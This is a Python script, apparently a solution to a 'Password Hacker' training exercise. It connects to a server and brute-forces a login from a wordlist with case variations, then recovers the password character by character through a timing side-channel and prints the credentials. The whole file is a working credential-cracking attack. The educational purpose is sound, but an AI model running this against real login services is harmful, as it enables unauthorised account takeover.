# write your code here
import sys
import socket
import itertools
import json
import string
import time

characters = string.ascii_letters + string.digits

args = sys.argv
ip = args[1]
port = int(args[2])

client_socket = socket.socket()
address = (ip, port)
client_socket.connect(address)

with open("C:\\Users\\005am\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt") as f:
    text = f.read()

list_of_words = text.splitlines()


def parse():
    login = find_login()
    password = find_pas(login)
    print(json.dumps(dict(login=login, password=password)))


def find_login():
    for word in list_of_words:
        list_of_letters = []
        word.lower()
        for letter in word:
            if letter.isalpha():
                list_of_letters.append([letter, letter.upper()])
            else:
                list_of_letters.append([letter])
        for login_tuple in itertools.product(*list_of_letters):
            login = "".join(login_tuple)
            message = dict(login=login, password='')
            if send_get(message) == 2:
                return login


def find_pas(login):
    password = ""
    while True:
        for letter in characters:
            word = "" + password
            word = word + letter
            message = dict(login=login, password=word)
            try:
                start = time.perf_counter()
                status = send_get(message)
                duration = time.perf_counter() - start
            except ConnectionAbortedError:
                continue
            if duration > 0.1 and status == 2:
                password = password + letter
            elif status == 3:
                password = password + letter
                return password


def send_get(message):
    message = json.dumps(message)
    data = message.encode()
    client_socket.send(data)

    response = client_socket.recv(1024)
    response = response.decode()
    response = json.loads(response)

    if response['result'] == "Wrong login!":
        return 1
    elif response['result'] == "Wrong password!":
        return 2
    elif response['result'] == "Connection success!":
        return 3


parse()

client_socket.close()
